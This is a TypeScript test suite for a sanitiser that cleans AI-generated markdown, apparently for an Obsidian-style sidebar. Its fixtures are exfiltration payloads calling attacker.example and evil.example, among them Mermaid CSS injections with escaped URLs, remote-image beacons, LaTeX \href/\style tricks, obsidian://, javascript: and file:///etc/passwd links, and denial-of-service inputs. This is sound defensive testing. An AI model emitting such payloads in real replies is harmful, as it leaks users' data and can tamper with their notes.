import { describe, expect, test } from "bun:test";
import { sanitizeModelMarkdown, sanitizeModelMarkdownDetailed, splitUnclosedMermaid } from "../src/safety/sanitize";
import * as renderSafety from "../src/ui/sidebar/renderSafety";

describe("module layout", () => {
	test("renderSafety re-exports the sanitiser and the guards from src/safety", () => {
		expect(renderSafety.sanitizeModelMarkdown).toBe(sanitizeModelMarkdown);
		expect(renderSafety.sanitizeModelMarkdownDetailed).toBe(sanitizeModelMarkdownDetailed);
		expect(typeof renderSafety.validateMermaidSource).toBe("function");
		expect(typeof renderSafety.classifyLinkDestination).toBe("function");
		expect(typeof renderSafety.isSafeImageDestination).toBe("function");
		expect(renderSafety.NEUTRAL_CODE_LANGUAGE).toBe("text");
		expect(renderSafety.PLAIN_CODE_LANGUAGES.has("mermaid")).toBe(true);
	});
});

describe("sanitizeModelMarkdown: mermaid guard", () => {
	const fence = (body: string): string => `\`\`\`mermaid\n${body}\n\`\`\``;
	const host = "attacker.example";
	const payloads: Record<string, string> = {
		"hex-escaped themeCSS": `%%{init: {"themeCSS": ".nodeLabel{background-image:url(\\000068ttp\\00003a\\00002f\\00002f${host}/x)}"}}%%\nflowchart TD\n  A --> B`,
		"themeCSS in frontmatter": `---\nconfig:\n  themeCSS: ".nodeLabel{background-image:url(\\000068ttp\\00003a\\00002f\\00002f${host}/x)}"\n---\nflowchart TD\n  A --> B`,
		"fontFamily declaration injection": `%%{init: {"fontFamily": "x; background-image: url(\\000068ttp\\00003a\\00002f\\00002f${host}/x)"}}%%\nflowchart TD\n  A --> B`,
		"YAML unicode escapes": `flowchart TD\n  A@{ img: "http\\x3a\\U0000002f\\U0000002f${host}/x", label: "x" }`,
		"hash entities": `flowchart TD\n  A["<img src='#104;ttp#58;#47;#47;${host}#58;8080/x'>"]`,
		"plain URL control": `flowchart TD\n  A["https://${host}/x"] --> B`,
		"click control": `flowchart TD\n  A --> B\n  click A href "https://${host}"`
	};

	test("relabels the five confirmed bypass payloads and the plain-URL controls", () => {
		for (const [name, body] of Object.entries(payloads)) {
			expect({ name, start: sanitizeModelMarkdown(fence(body)).split("\n")[0] }).toEqual({ name, start: "```text" });
		}
	});

	test("keeps diagrams whose labels mention schemes, slashes and entities", () => {
		const bodies = [
			"flowchart TD\n  A[file: config.yaml] --> B[Parser]",
			"sequenceDiagram\n  Client->>Server: ws: subscribe\n  participant FTP\n  FTP->>Client: HTTP: GET /",
			"flowchart LR\n  A[client // server] --> B[\"R&D #35;1 and Q&A\"]",
			"flowchart TD\n  %% note: http: later\n  A --> B"
		];
		for (const body of bodies) {
			expect(sanitizeModelMarkdown(fence(body))).toBe(fence(body));
		}
	});

	test("judges a nested fence on its own lines only", () => {
		const nested = "1. Step one\n\n   ```mermaid\n   flowchart TD\n     A[file: x] --> B\n   ```\n\n   Docs: https://example.com\n";
		expect(sanitizeModelMarkdown(nested)).toBe(nested);
		const hostile = "1. Step one\n\n   ```mermaid\n   flowchart TD\n     A@{ img: \"https://e.example/x.png\" }\n   ```\n\n   Docs: https://example.com\n";
		expect(sanitizeModelMarkdown(hostile)).toContain("   ```text\n");
	});

	test("an over-indented line that looks like a closing fence does not end the diagram early", () => {
		const img = "A@{ img: \"https://attacker.example/x.png\" }";
		const quoted = ["> ```mermaid", "> flowchart TD", ">     ```", `> ${img}`, "> ```"].join("\n");
		expect(sanitizeModelMarkdown(quoted)).toStartWith("> ```text");
		const listed = ["- item", "  ```mermaid", "  flowchart TD", "         ```", `  ${img}`, "  ```"].join("\n");
		expect(sanitizeModelMarkdown(listed)).toContain("  ```text");
		const tabbed = ["- item", "\t```mermaid", "\tflowchart TD", "\t\t\t```", `\t${img}`, "\t```"].join("\n");
		expect(sanitizeModelMarkdown(tabbed)).toContain("\t```text");
		const indented = ["   ```mermaid", "   flowchart TD", "       ```", `   ${img}`, "   ```"].join("\n");
		expect(sanitizeModelMarkdown(indented)).toStartWith("   ```text");
	});

	test("a closing fence indented by up to three columns still closes a quoted or list diagram", () => {
		const quoted = "> ```mermaid\n> flowchart TD\n>    ```\n\nSee https://example.com";
		expect(sanitizeModelMarkdown(quoted)).toBe(quoted);
		const listed = "- item\n  ```mermaid\n  flowchart TD\n     ```\n\n  See https://example.com";
		expect(sanitizeModelMarkdown(listed)).toBe(listed);
	});

	test("a parser that lets a quoted or list fence outlive its container still has its whole diagram checked", () => {
		const img = "A@{ img: \"https://attacker.example/x.png\" }";
		// By CommonMark the fence ends at the flush-left line; a lenient parser would carry on to the closing fence.
		const listed = ["- item", "  ```mermaid", "  flowchart TD", "B --> C", `  ${img}`, "  ```"].join("\n");
		expect(sanitizeModelMarkdown(listed)).toContain("  ```text");
		const quoted = ["> ```mermaid", "> flowchart TD", "", `${img}`, "> ```"].join("\n");
		expect(sanitizeModelMarkdown(quoted)).toContain("> ```text");
		// With no closing fence at all the checked part runs to the end of the reply.
		const open = `> \`\`\`mermaid\n> flowchart TD\n\nSee https://example.com`;
		expect(sanitizeModelMarkdown(open)).toStartWith("> ```text");
	});

	test("a quoted diagram that ends where its quote ends is still a diagram when a closing fence follows", () => {
		const text = "> ```mermaid\n> flowchart TD\n>   A --> B\n\nIntro\n```\n\nSee https://example.com";
		const result = sanitizeModelMarkdownDetailed(text);
		expect(result.mermaid[0]).toMatchObject({ closed: true });
	});

	test("explains why a diagram became code", () => {
		const result = sanitizeModelMarkdownDetailed(`Intro\n\n${fence(payloads["plain URL control"])}\n\n${fence("flowchart TD\n  A --> B")}`);
		expect(result.mermaid).toHaveLength(2);
		expect(result.mermaid[0]).toMatchObject({ closed: true, downgraded: true, openLine: 2 });
		expect(result.mermaid[0].verdict.reasons[0]).toMatchObject({ code: "remote-reference", line: 2 });
		expect(result.mermaid[1]).toMatchObject({ closed: true, downgraded: false, openLine: 7 });
		expect(result.findings.map((finding) => finding.kind)).toEqual(["unsafe-diagram"]);
		expect(result.findings[0].message).toContain("external address");
	});

	test("reports a fence that has no closing line yet, as in a streaming reply", () => {
		const result = sanitizeModelMarkdownDetailed("```mermaid\nflowchart TD\n  A --> B");
		expect(result.mermaid[0]).toMatchObject({ closed: false, downgraded: false, source: "flowchart TD\n  A --> B" });
	});

	test("accepts the strict plugin header only when asked", () => {
		const header = "---\nconfig:\n  theme: base\n  look: classic\n  layout: dagre\n  themeVariables:\n    primaryColor: \"#352FA0\"\n---";
		const text = fence(`${header}\nflowchart TD\n  A --> B\n  classDef primary fill:#352FA0,stroke:#9C98FF,color:#ffffff;`);
		expect(sanitizeModelMarkdown(text)).toStartWith("```text");
		expect(sanitizeModelMarkdown(text, { allowPluginMermaidHeader: true })).toBe(text);
		const unsafe = fence(`${header.replace("#352FA0", "red; background:url(x)")}\nflowchart TD\n  A --> B`);
		expect(sanitizeModelMarkdown(unsafe, { allowPluginMermaidHeader: true })).toStartWith("```text");
	});

	test("keeps a diagram the exemption says the source already had", () => {
		const text = fence("%%{init: {\"theme\": \"dark\"}}%%\nflowchart TD\n  A --> B");
		expect(sanitizeModelMarkdown(text)).toStartWith("```text");
		expect(sanitizeModelMarkdown(text, { isExempt: (finding) => finding.kind === "unsafe-diagram" })).toBe(text);
	});
});

describe("sanitizeModelMarkdown: tags longer than the old scan window", () => {
	const filler = "a".repeat(2100);
	const cases: Array<[string, string, string]> = [
		["style url()", `<div style="color:red;${" ".repeat(2100)}background:url(https://evil.test/p.png)">x</div>`, "&lt;div"],
		["input src", `<input type="image" title="${filler}" src="https://evil.test/p.png">`, "&lt;input"],
		["background", `<td title="${filler}" background="https://evil.test/p.png">x</td>`, "&lt;td"],
		["srcset", `<span title="${filler}" srcset="https://evil.test/p.png 1x">x</span>`, "&lt;span"],
		["blocked href", `<a title="${filler}" href="obsidian://new?file=a&overwrite=true">x</a>`, "&lt;a"]
	];

	for (const [name, tag, expected] of cases) {
		test(`escapes ${name} behind a long attribute, in an HTML block and inline`, () => {
			expect(sanitizeModelMarkdown(tag)).toContain(expected);
			expect(sanitizeModelMarkdown(`Text before ${tag} and after.`)).toContain(expected);
		});
	}

	test("escapes a candidate tag whose end is out of reach", () => {
		expect(sanitizeModelMarkdown(`<span title="${"a".repeat(30000)}`)).toStartWith("&lt;span");
		expect(sanitizeModelMarkdown("a <span title=\"x")).toBe("a &lt;span title=\"x");
	});

	test("leaves a long benign tag alone when its end is found", () => {
		const benign = `<span title="${filler}">x</span>`;
		expect(sanitizeModelMarkdown(benign)).toBe(benign);
		expect(sanitizeModelMarkdown(`Text ${benign} more`)).toBe(`Text ${benign} more`);
	});
});

describe("sanitizeModelMarkdown: link policy", () => {
	const blocked = [
		"obsidian://open?vault=x", "obsidian://new?file=a&content=b&overwrite=true", "file:///etc/passwd", "mailto:a@b.c",
		"tel:+441234", "javascript:alert(1)", "data:text/html,x", "vscode://file/x", "obsidian&#58;//open", "java&Tab;script:alert(1)",
		"obsidian&colon;&sol;&sol;open", "JAVASCRIPT:alert(1)"
	];

	test("inline links to blocked destinations become inert text with the literal URL", () => {
		for (const destination of blocked) {
			const result = sanitizeModelMarkdown(`[open](${destination})`);
			expect({ destination, result }).toEqual({ destination, result: `[open]\\(\`${destination}\`)` });
		}
	});

	test("titles, angle brackets and nested brackets are handled", () => {
		expect(sanitizeModelMarkdown("[a](obsidian://x \"title\")")).toBe("[a]\\(`obsidian://x` \"title\")");
		expect(sanitizeModelMarkdown("[a](<obsidian://x y>)")).toBe("[a]\\(`<obsidian://x y>`)");
		expect(sanitizeModelMarkdown("[a [b] c](obsidian://x)")).toBe("[a [b] c]\\(`obsidian://x`)");
		expect(sanitizeModelMarkdown("[a](obsidian://x`y)")).toBe("[a]\\(``obsidian://x`y``)");
	});

	test("a link that is not well formed is still neutralised", () => {
		const result = sanitizeModelMarkdown("[a](obsidian://x y)");
		expect(result).not.toContain("](");
		expect(result).toContain("obsidian://x");
	});

	test("http, vault-relative, in-page and wiki links stay links", () => {
		const text = "[a](https://example.com/x?y=1) [b](Note.md) [c](#Heading) [d](folder/My%20Note.md#h) [e](<Note with space.md>) [[Wiki|alias]] <https://example.com> [f](//cdn.example/x)";
		expect(sanitizeModelMarkdown(text)).toBe(text);
	});

	test("links to blocked destinations inside code are left alone", () => {
		const text = "`[open](obsidian://x)`\n\n```md\n[open](obsidian://x)\n```";
		expect(sanitizeModelMarkdown(text)).toBe(text);
	});

	test("a remote image with a blocked destination is neutralised as both an image and a link", () => {
		expect(sanitizeModelMarkdown("![x](obsidian://new?file=a)")).toBe("[Remote image: x]\\(`obsidian://new?file=a`)");
		expect(sanitizeModelMarkdown("![](file:///etc/passwd)")).toBe("[Remote image]\\(`file:///etc/passwd`)");
		const dataImage = "![dot](data:image/png;base64,iVBORw0KGgo=) and [![dot](x.png)](https://example.com)";
		expect(sanitizeModelMarkdown(dataImage)).toBe(dataImage);
	});

	test("a data:image link that is not an image is neutralised", () => {
		expect(sanitizeModelMarkdown("[x](data:image/png;base64,AAAA)")).toBe("[x]\\(`data:image/png;base64,AAAA`)");
	});

	test("autolinks to blocked destinations are escaped", () => {
		expect(sanitizeModelMarkdown("<obsidian://open?vault=x>")).toBe("&lt;obsidian://open?vault=x>");
		expect(sanitizeModelMarkdown("see <mailto:a@b.c> and <a@b.co> and <https://example.com>")).toBe("see &lt;mailto:a@b.c> and &lt;a@b.co> and <https://example.com>");
		expect(sanitizeModelMarkdown("a <b> c <i>d</i>")).toBe("a <b> c <i>d</i>");
	});

	test("raw anchors with blocked hrefs are escaped, in any quoting or encoding", () => {
		for (const href of ["\"obsidian://open\"", "'javascript:alert(1)'", "obsidian://x", "\"obsidian&#58;//x\"", "\"java&Tab;script:alert(1)\"", "\"mailto:a@b.c\""]) {
			expect({ href, result: sanitizeModelMarkdown(`<a href=${href}>go</a>`).startsWith("&lt;a href=") }).toEqual({ href, result: true });
		}
		for (const safe of ["<a href=\"https://example.com\">a</a>", "<a href=\"Note.md\">a</a>", "<a href=\"#h\">a</a>", "<a>a</a>"]) {
			expect(sanitizeModelMarkdown(safe)).toBe(safe);
		}
	});

	test("reference definitions to blocked destinations are broken", () => {
		expect(sanitizeModelMarkdown("[x][r]\n\n[r]: obsidian://open")).toContain("[r\\]: obsidian://open");
		expect(sanitizeModelMarkdown("[x][r]\n\n[r]: obsidian&#58;//open")).toContain("[r\\]:");
	});

	test("reports the neutralised links", () => {
		const result = sanitizeModelMarkdownDetailed("[a](obsidian://x) and <a href=\"mailto:a@b.c\">b</a>");
		expect(result.findings.map((finding) => finding.kind)).toEqual(["blocked-link", "blocked-link"]);
		expect(result.findings[0].line).toBe(1);
	});
});

describe("sanitizeModelMarkdown: exemptions and findings", () => {
	const evil = "![a](https://e.example/x.png)\n\n```dataviewjs\ndv.paragraph(1)\n```\n\n`$= dv.current()`\n\n<img src=\"https://e.example/y.png\">";

	test("reports each neutralised construct with its kind and line", () => {
		const result = sanitizeModelMarkdownDetailed(evil);
		expect(result.findings.map((finding) => [finding.kind, finding.line])).toEqual([
			["remote-image", 1],
			["plugin-fence", 3],
			["dataview-inline", 7],
			["network-html", 9]
		]);
	});

	test("an exemption keeps the original construct and leaves it out of the findings", () => {
		expect(sanitizeModelMarkdown(evil, { isExempt: () => true })).toBe(evil);
		expect(sanitizeModelMarkdownDetailed(evil, { isExempt: () => true }).findings).toEqual([]);
		const keepFences = sanitizeModelMarkdown(evil, { isExempt: (finding) => finding.kind === "plugin-fence" });
		expect(keepFences).toContain("```dataviewjs");
		expect(keepFences).toContain("[Remote image: a]");
	});

	test("findings carry the construct as an excerpt", () => {
		const result = sanitizeModelMarkdownDetailed("```dataviewjs\ndv.paragraph(1)\n```");
		expect(result.findings[0].excerpt).toBe("```dataviewjs\ndv.paragraph(1)");
	});
});

describe("sanitizeModelMarkdown: math commands that load or link", () => {
	const ZWSP = "\u200B";

	test("defuses \\href, \\url, \\style, \\class and \\cssId in inline and block maths", () => {
		for (const command of ["href", "url", "style", "class", "cssId"]) {
			const inline = sanitizeModelMarkdown(`Value $\\${command}{https://attacker.example/?d=1}{x}$ here`);
			expect({ command, defused: inline.includes(`\\${ZWSP}${command}`), live: inline.includes(`\\${command}{`) }).toEqual({ command, defused: true, live: false });
			const block = sanitizeModelMarkdown(`$$\n\\${command}{background:url(https://attacker.example/x)}{y}\n$$`);
			expect(block).not.toContain(`\\${command}{`);
		}
	});

	test("defuses them inside a math code block as well", () => {
		const result = sanitizeModelMarkdown("```math\n\\style{background:url(https://attacker.example/x)}{y}\n```");
		expect(result).toBe(`\`\`\`math\n\\${ZWSP}style{background:url(https://attacker.example/x)}{y}\n\`\`\``);
	});

	test("leaves ordinary maths, escaped backslashes, longer command names and code alone", () => {
		const text = "$\\frac{a}{b} + \\styled{x} + \\classic + \\\\href$ and `\\href{x}{y}` and ```\\href```\n\n```latex\n\\href{x}{y}\n```";
		expect(sanitizeModelMarkdown(text)).toBe(text);
	});

	test("reports the defused command", () => {
		const result = sanitizeModelMarkdownDetailed("$\\href{https://e.example}{x}$");
		expect(result.findings.map((finding) => finding.kind)).toEqual(["math-command"]);
	});
});

describe("sanitizeModelMarkdown: stable output", () => {
	test("realistic replies settle after one call", () => {
		const replies = [
			"# Notes\n\n![chart](https://attacker.example/p?d=1)\n\n```dataviewjs\ndv.paragraph(1)\n```\n\nInline `$= dv.current()` and <img src=\"https://attacker.example/x\">.\n\n[go](obsidian://open?vault=x) and <a href=\"mailto:a@b.c\">mail</a>",
			"```mermaid\nflowchart TD\n  A[\"https://attacker.example\"] --> B\n```\n\n$\\href{https://e.example}{x}$ and [x][r]\n\n[r]: obsidian://open",
			"- item\n  ```dataview\n  TABLE file.name\n  ```\n\n> [!note]\n> <iframe src=\"https://e.example\"></iframe>"
		];
		for (const reply of replies) {
			const once = sanitizeModelMarkdown(reply);
			expect(sanitizeModelMarkdown(once)).toBe(once);
			expect(sanitizeModelMarkdownDetailed(once).findings).toEqual([]);
		}
	});
});

describe("splitUnclosedMermaid", () => {
	test("holds back a fence that is still being written", () => {
		const split = splitUnclosedMermaid("Intro\n\n```mermaid\nflowchart TD\n  A --> B");
		expect(split).toEqual({ settled: "Intro\n", pendingSource: "flowchart TD\n  A --> B" });
	});

	test("settles a reply whose diagrams are all closed", () => {
		const text = "```mermaid\nflowchart TD\n  A --> B\n```\n\nDone.";
		expect(splitUnclosedMermaid(text)).toEqual({ settled: text, pendingSource: null });
		expect(splitUnclosedMermaid("No diagram here.")).toEqual({ settled: "No diagram here.", pendingSource: null });
	});

	test("finds a fence inside a quote and keeps the text before it, whatever the line endings", () => {
		expect(splitUnclosedMermaid("> Note\r\n> ```mermaid\r\n> flowchart TD")).toEqual({ settled: "> Note", pendingSource: "flowchart TD" });
	});

	test("a closed diagram before an open one stays settled", () => {
		const split = splitUnclosedMermaid("```mermaid\nflowchart TD\n  A --> B\n```\n\n```mermaid\nsequenceDiagram");
		expect(split.settled).toBe("```mermaid\nflowchart TD\n  A --> B\n```\n");
		expect(split.pendingSource).toBe("sequenceDiagram");
	});
});

describe("sanitizeModelMarkdown: work budget", () => {
	test("8,000 unterminated image destinations finish quickly and stay neutralised", () => {
		const input = "![a](b".repeat(8000);
		const started = performance.now();
		const result = sanitizeModelMarkdownDetailed(input);
		expect(performance.now() - started).toBeLessThan(200);
		expect(result.text).not.toMatch(/(?<!\\)!\[/);
		expect(result.budgetExhausted).toBe(true);
		expect(result.findings.some((finding) => finding.kind === "scan-limit")).toBe(true);
	});

	test("many tags, brackets and definitions without an end stay linear", () => {
		const inputs = [
			"<a ".repeat(8000),
			"<img ".repeat(8000),
			"[[".repeat(8000),
			"](".repeat(8000),
			"]:".repeat(8000),
			"![[".repeat(8000),
			"`a``b```c".repeat(2000),
			`${"<b ".repeat(2000)}\n\n${"![x][y] ".repeat(2000)}`,
			Array.from({ length: 5000 }, () => "- ```mermaid").join("\n"),
			Array.from({ length: 5000 }, () => "> ```mermaid").join("\n"),
			Array.from({ length: 3000 }, () => "- ```mermaid\n  flowchart TD").join("\n")
		];
		for (const input of inputs) {
			const started = performance.now();
			sanitizeModelMarkdown(input);
			expect(performance.now() - started).toBeLessThan(300);
		}
	});

	test("closing-line doubt and task checkbox prefixes stay linear on hostile shapes", () => {
		const inputs = [
			`${"- [ ] ".repeat(30000)}\`\`\`js`,
			`${"- [x] > ".repeat(20000)}x`,
			`${" ".repeat(200000)}x`,
			`\`\`\`js\n${"`".repeat(200000)}x\n\`\`\``,
			`\`\`\`js\n${"~`".repeat(100000)}\n\`\`\``,
			`\`\`\`js\n${"```~\n".repeat(20000)}`,
			Array.from({ length: 5000 }, () => "```mermaid\nflowchart TD\n```\t").join("\n"),
			Array.from({ length: 5000 }, () => "```js\n```~").join("\n"),
			Array.from({ length: 5000 }, () => "- [ ] ```mermaid").join("\n")
		];
		for (const input of inputs) {
			const started = performance.now();
			sanitizeModelMarkdown(input);
			expect(performance.now() - started).toBeLessThan(500);
		}
	});

	test("an ordinary long reply is not affected by the budget", () => {
		const paragraph = "A sentence with [a link](https://example.com), an image ![pic](images/pic.png), `code` and <b>bold</b>.\n\n";
		const text = paragraph.repeat(2000);
		const result = sanitizeModelMarkdownDetailed(text);
		expect(result.budgetExhausted).toBe(false);
		expect(result.text).toBe(text);
	});

	test("a remote image after an exhausted budget is still neutralised", () => {
		const text = `${"![a](b".repeat(300)}\n\n![x](https://evil.example/p?d=secret)`;
		const result = sanitizeModelMarkdown(text);
		expect(result).not.toMatch(/(?<!\\)!\[/);
		expect(result).toContain("https://evil.example/p?d=secret");
	});
});
